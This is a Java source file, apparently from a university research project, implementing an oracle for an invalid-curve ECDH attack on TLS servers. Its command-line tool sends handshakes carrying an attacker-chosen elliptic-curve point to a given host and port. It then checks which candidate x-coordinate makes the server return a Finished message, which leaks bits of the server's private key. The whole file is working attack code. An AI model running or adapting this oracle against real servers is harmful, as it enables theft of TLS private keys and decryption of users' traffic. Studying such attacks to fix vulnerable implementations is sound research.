/*
 * 
 */
package de.rub.nds.ecdhattack.oracle;

import de.rub.nds.ecdhattack.utilities.NastyPoint;
import de.rub.nds.ssl.stack.ECUtility;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.EECPointFormat;
import java.math.BigInteger;
import java.net.SocketException;
import java.util.LinkedList;
import java.util.List;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class ECDHOracle {
    
    public static List launchHandshakes(String host, int port, String baseX, String baseY,
            String[] possibilities) throws SocketException, InterruptedException {
        TLSConnector tlsConnector = new TLSConnector(host, port);
        byte[] encodedNastyPoint;
        
        NastyPoint point = new NastyPoint();
        point.x = new BigInteger(baseX, 16);
        point.y = new BigInteger(baseY, 16);
        encodedNastyPoint = ECUtility.encodeX9_62(point.x.toByteArray(),
                point.y.toByteArray(), EECPointFormat.UNCOMPRESSED);
        
        List<Integer> result = new LinkedList<Integer>();
        // search for a first valid value of the x-coordinate
        String firstValid = findFirstValid(tlsConnector, encodedNastyPoint, possibilities);
        for (int i = 0; i < possibilities.length; i++) {
            if (possibilities[i].equals(firstValid)) {
                result.add(i + 1);
            }
        }
        
        if(result.isEmpty()) {
            result.add(0);
        }
        return result;
    }
    
    private static String findFirstValid(TLSConnector tlsConnector, byte[] encodedNastyPoint,
            String[] possibilities) throws SocketException, InterruptedException {
        for (int i = 0; i < possibilities.length; i++) {
            BigInteger x = new BigInteger(possibilities[i], 16);
            boolean finishedReceived = tlsConnector.launchHandshake(encodedNastyPoint, x.toByteArray());
            if (finishedReceived) {
                return possibilities[i];
            }
        }
        return null;
    }
    
    public static void main(final String[] args) throws
            Exception {
        if (args.length == 0 || args.length < 5) {
            System.out.println("Usage: ECDHOracle host port baseX baseY xPossibilities");
        }
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String baseX = args[2];
        String baseY = args[3];
        String[] xPossibilities = new String[args.length - 4];
        for (int i = 0; i < xPossibilities.length; i++) {
            xPossibilities[i] = args[4 + i];
        }
        List<Integer> s = ECDHOracle.launchHandshakes(host, port, baseX, baseY, xPossibilities);
        if (s.size() == 0) {
            throw new RuntimeException("Something went wrong, no s value found");
        }
        
        System.out.println("results: ");
        for (Integer i : s) {
            System.out.println(i);
        }
    }
}
